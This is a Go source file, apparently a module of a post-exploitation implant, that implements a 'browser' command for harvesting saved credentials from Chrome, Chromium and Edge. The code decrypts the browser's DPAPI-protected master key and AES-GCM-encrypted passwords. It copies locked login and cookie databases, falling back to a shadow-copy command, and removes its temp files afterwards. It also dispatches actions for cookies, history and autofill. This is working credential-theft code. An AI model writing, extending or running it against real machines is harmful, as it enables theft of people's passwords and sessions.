//go:build windows

package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type BrowserCommand struct{}

func (c *BrowserCommand) Name() string {
	return "browser"
}

func (c *BrowserCommand) Description() string {
	return "Harvest saved credentials from Chromium-based browsers (Chrome, Edge)"
}

type browserCred struct {
	Browser  string
	URL      string
	Username string
	Password string
}

type browserCookie struct {
	Browser  string
	Host     string
	Name     string
	Value    string
	Path     string
	Expires  int64
	Secure   bool
	HTTPOnly bool
}

func (c *BrowserCommand) Execute(task structs.Task) structs.CommandResult {
	var args browserArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			args.Action = "passwords"
			args.Browser = "all"
		}
	}

	if args.Action == "" {
		args.Action = "passwords"
	}
	if args.Browser == "" {
		args.Browser = "all"
	}

	switch strings.ToLower(args.Action) {
	case "passwords":
		return browserPasswords(args)
	case "cookies":
		return browserCookies(args)
	case "history":
		return browserHistory(args)
	case "autofill":
		return browserAutofill(args)
	case "bookmarks":
		return browserBookmarks(args)
	case "downloads":
		return browserDownloads(args)
	default:
		return errorf("Unknown action: %s. Use: passwords, cookies, history, autofill, bookmarks, downloads", args.Action)
	}
}

// browserPaths returns the User Data directories for supported browsers
func browserPaths(browser string) map[string]string {
	localAppData := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")
	if localAppData == "" {
		return nil
	}

	all := map[string]string{
		"Chrome":   filepath.Join(localAppData, "Google", "Chrome", "User Data"),
		"Chromium": filepath.Join(localAppData, "Chromium", "User Data"),
		"Edge":     filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
	}
	if appData != "" {
		all["Firefox"] = filepath.Join(appData, "Mozilla", "Firefox", "Profiles")
	}

	switch strings.ToLower(browser) {
	case "chrome":
		return map[string]string{"Chrome": all["Chrome"]}
	case "chromium":
		return map[string]string{"Chromium": all["Chromium"]}
	case "edge":
		return map[string]string{"Edge": all["Edge"]}
	case "firefox":
		if v, ok := all["Firefox"]; ok {
			return map[string]string{"Firefox": v}
		}
		return nil
	default:
		return all
	}
}

// getEncryptionKey reads and decrypts the browser's AES encryption key
func getEncryptionKey(userDataDir string) ([]byte, error) {
	localStatePath := filepath.Join(userDataDir, "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("read Local State: %w", err)
	}
	defer structs.ZeroBytes(data)

	var localState struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, fmt.Errorf("parse Local State: %w", err)
	}

	if localState.OsCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("no encrypted_key in Local State")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("base64 decode key: %w", err)
	}
	defer structs.ZeroBytes(encryptedKey)

	// Strip "DPAPI" prefix (5 bytes)
	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
		return nil, fmt.Errorf("unexpected key prefix (not DPAPI)")
	}

	// Decrypt with DPAPI (pass slice past DPAPI prefix)
	return dpapiDecrypt(encryptedKey[5:])
}

// dpapiDecrypt calls CryptUnprotectData to decrypt DPAPI-protected data
func dpapiDecrypt(data []byte) ([]byte, error) {
	dataIn := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}
	var dataOut windows.DataBlob

	err := windows.CryptUnprotectData(&dataIn, nil, nil, 0, nil, 0, &dataOut)
	if err != nil {
		return nil, fmt.Errorf("CryptUnprotectData: %w", err)
	}

	// Copy output and free the system-allocated buffer
	result := make([]byte, dataOut.Size)
	copy(result, unsafe.Slice(dataOut.Data, dataOut.Size))
	windows.LocalFree(windows.Handle(unsafe.Pointer(dataOut.Data)))

	return result, nil
}

// decryptPassword decrypts a Chrome AES-GCM encrypted password
func decryptPassword(encryptedPassword []byte, key []byte) (string, error) {
	if len(encryptedPassword) < 15 {
		return "", fmt.Errorf("encrypted data too short")
	}

	// Check for "v10" or "v11" prefix (AES-GCM encryption)
	prefix := string(encryptedPassword[:3])
	if prefix == "v10" || prefix == "v11" {
		encryptedPassword = encryptedPassword[3:]

		// 12-byte nonce + ciphertext (includes 16-byte GCM tag)
		if len(encryptedPassword) < 12+16 {
			return "", fmt.Errorf("encrypted data too short for AES-GCM")
		}

		nonce := encryptedPassword[:12]
		ciphertext := encryptedPassword[12:]

		block, err := aes.NewCipher(key)
		if err != nil {
			return "", fmt.Errorf("create AES cipher: %w", err)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", fmt.Errorf("create GCM: %w", err)
		}

		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "", fmt.Errorf("GCM decrypt: %w", err)
		}

		result := string(plaintext)
		structs.ZeroBytes(plaintext)
		return result, nil
	}

	// Legacy DPAPI-only encryption (no v10/v11 prefix)
	plaintext, err := dpapiDecrypt(encryptedPassword)
	if err != nil {
		return "", fmt.Errorf("DPAPI decrypt: %w", err)
	}
	result := string(plaintext)
	structs.ZeroBytes(plaintext)
	return result, nil
}

// copyFile copies src to dst for safe reading of locked databases.
// First tries CreateFileW with full sharing flags to bypass browser locks.
// Falls back to esentutl /y /vss which uses Volume Shadow Copy for
// exclusively-locked files (Chrome/Edge lock Cookies DB while running).
func copyFile(src, dst string) error {
	srcPtr, err := windows.UTF16PtrFromString(src)
	if err != nil {
		return err
	}
	h, err := windows.CreateFile(
		srcPtr,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err == nil {
		in := os.NewFile(uintptr(h), src)
		defer in.Close()
		out, outErr := os.Create(dst)
		if outErr != nil {
			return outErr
		}
		defer out.Close()
		_, copyErr := io.Copy(out, in)
		return copyErr
	}

	// Fallback: esentutl /y /vss copies via Volume Shadow Copy
	_, vssErr := execCmdTimeout("esentutl", "/y", "/vss", src, "/d", dst)
	if vssErr == nil {
		return nil
	}
	// Return original CreateFile error as it's more descriptive
	return fmt.Errorf("open %s: %w (VSS fallback also failed: %v)", filepath.Base(src), err, vssErr)
}

// findProfiles returns profile directories containing Login Data
func findProfiles(userDataDir string) []string {
	var profiles []string

	// Check Default profile
	defaultLogin := filepath.Join(userDataDir, "Default", "Login Data")
	if _, err := os.Stat(defaultLogin); err == nil {
		profiles = append(profiles, filepath.Join(userDataDir, "Default"))
	}

	// Check numbered profiles (Profile 1, Profile 2, etc.)
	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "Profile ") {
			loginPath := filepath.Join(userDataDir, entry.Name(), "Login Data")
			if _, err := os.Stat(loginPath); err == nil {
				profiles = append(profiles, filepath.Join(userDataDir, entry.Name()))
			}
		}
	}

	return profiles
}

// openBrowserDB opens a browser SQLite database using the copy+fallback pattern.
// Returns (db, cleanup func, error). Caller must call cleanup when done.
func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
	// Strategy 1: Copy DB (and WAL/SHM journals) to temp file
	tf, tfErr := os.CreateTemp("", "")
	if tfErr == nil {
		tmpFile := tf.Name()
		tf.Close()
		if copyErr := copyFile(dbPath, tmpFile); copyErr == nil {
			// Also copy WAL and SHM journals if they exist — required for WAL-mode DBs
			copyFile(dbPath+"-wal", tmpFile+"-wal") //nolint:errcheck
			copyFile(dbPath+"-shm", tmpFile+"-shm") //nolint:errcheck
			db, err := sql.Open("sqlite", tmpFile)
			if err == nil {
				// Verify the DB is actually usable (sql.Open is lazy)
				if pingErr := db.Ping(); pingErr == nil {
					cleanup := func() {
						db.Close()
						secureRemove(tmpFile)
						secureRemove(tmpFile + "-wal")
						secureRemove(tmpFile + "-shm")
					}
					return db, cleanup, nil
				}
				db.Close()
			}
		}
		secureRemove(tmpFile)
		secureRemove(tmpFile + "-wal")
		secureRemove(tmpFile + "-shm")
	}

	// Strategy 2: Open in immutable mode
	immutableURI := "file:///" + filepath.ToSlash(dbPath) + "?immutable=1"
	db, err := sql.Open("sqlite", immutableURI)
	if err != nil {
		return nil, func() {}, fmt.Errorf("open %s: %w", filepath.Base(dbPath), err)
	}
	// Verify immutable mode works
	if pingErr := db.Ping(); pingErr != nil {
		db.Close()
		return nil, func() {}, fmt.Errorf("open %s: %w", filepath.Base(dbPath), pingErr)
	}
	cleanup := func() { db.Close() }
	return db, cleanup, nil
}
